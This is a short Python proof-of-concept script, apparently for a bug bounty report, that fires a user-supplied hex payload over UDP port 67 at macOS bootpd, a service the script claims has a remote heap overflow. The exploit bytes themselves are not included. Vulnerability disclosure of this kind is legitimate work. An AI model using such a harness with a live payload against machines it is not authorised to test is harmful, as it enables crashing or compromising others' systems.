#!/usr/bin/env python3
"""
ASB Submission PoC: Unauthenticated Remote Heap Overflow in bootpd
Target: macOS 14.x /usr/libexec/bootpd
"""

import socket
import argparse
import sys

def blast_target(ip: str, port: int, payload_hex: str):
    try:
        payload = bytes.fromhex(payload_hex)
    except ValueError as e:
        print(f"[-] Invalid hex payload: {e}")
        sys.exit(1)

    print(f"[*] Firing {len(payload)} byte malicious DHCP Option at {ip}:{port}...")
    
    # Create standard unprivileged UDP socket
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(payload, (ip, port))
        
    print("[+] Payload sent. Check the target's /Library/Logs/DiagnosticReports/ for the bootpd .ips crash log.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="bootpd RCE PoC")
    parser.add_argument("target_ip", help="IP address of the target Mac")
    parser.add_argument("payload_hex", help="The PoC hex string")
    parser.add_argument("--port", type=int, default=67, help="bootpd UDP port (default: 67)")
    
    args = parser.parse_args()
    blast_target(args.target_ip, args.port, args.payload_hex)
